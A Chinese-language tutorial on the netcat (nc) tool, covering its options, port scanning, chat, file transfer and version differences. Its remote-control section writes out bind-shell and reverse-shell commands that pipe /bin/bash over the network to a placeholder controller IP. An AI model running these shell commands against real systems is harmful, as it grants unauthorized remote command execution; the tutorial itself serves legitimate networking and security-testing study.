# nc扫描传递信息

nc命令是netcat命令的简称，是一个功能强大的网络工具，可用于端口扫描、文件传输、网络连接等多种用途。

## 命令选项

```bash
-g <网关>       设置路由器跃程通信网关，最多设置8个
-G <指向器数目> 设置来源路由指向器，其数值为4的倍数
-h             在线帮助
-i <延迟秒数>   设置时间间隔，以便传送信息及扫描通信端口
-l             使用监听模式，监控传入的资料
-n             直接使用ip地址，而不通过域名服务器
-o <输出文件>   指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存
-p <通信端口>   设置本地主机使用的通信端口
-r             指定源端口和目的端口都进行随机的选择
-s <来源位址>   设置本地主机送出数据包的IP地址
-u             使用UDP传输协议
-v             显示指令执行过程
-w <超时秒数>   设置等待连线的时间
-z             使用0输入/输出模式，只在扫描通信端口时使用
```

## 基础使用

### 端口扫描

使用netcat探测端口是否开放：

```bash
nc -z -v [目标IP] [端口]
```

例如：
```bash
nc -z -v 192.168.1.1 80
```

### 简易聊天

使用netcat可以实现局域网内的简易通信：

**监听端(IP1)：**
```bash
nc -l [端口]
```

**连接端(IP2)：**
```bash
nc [IP1] [端口]
```

连接建立后，任意一端在终端中的输入都会显示在另一端。

### 文件传输

通过重定向输入输出，netcat可以实现文件传输：

**接收端：**
```bash
nc -l [端口] > 接收文件名
```

**发送端：**
```bash
nc [接收端IP] [端口] < 发送文件名
```

注意：传输完成后不会自动断开连接，需要手动按Ctrl+C终止，且没有传输完成的提示。

### 远程控制

#### 正向连接

控制机器主动连接受控端称为正向连接：

**受控端：**
```bash
nc -l -p [端口] -e /bin/bash
```

**控制端：**
```bash
nc [受控端IP] [端口]
```

控制端连接后可以在受控端执行命令。

#### 反向连接

控制端启动监听等待受控端连接称为反向连接：

**控制端：**
```bash
nc -lv [端口]
```

**受控端：**
```bash
nc [控制端IP] [端口] -e /bin/bash
```

这种方式适用于受控端在内网而控制端有公网IP的情况。

## 版本差异注意事项

不同Linux发行版中的nc命令可能存在差异：

- **CentOS版本**：
  - 没有`-e`选项
  - 启动监听时不使用`-p`参数

- **Kali Linux版本**：
  - 支持`-e`选项
  - 启动监听必须使用`-p`指定端口（不用`-p`会使用随机端口）

## 安全应用场景

1. **端口扫描**：快速检测目标主机开放的端口
2. **安全测试**：模拟攻击者的网络行为
3. **应急响应**：在没有其他工具时进行临时文件传输
4. **网络诊断**：测试网络连通性和服务可用性

## 示例命令

```bash
# 扫描目标主机的80-90端口
nc -zv 192.168.1.1 80-90

# 监听UDP端口
nc -lu 53

# 持久化监听（连接断开后继续监听）
while true; do nc -l 8080; done

# 创建一个简单的Web服务器
while true; do nc -l 8080 < index.html; done
```
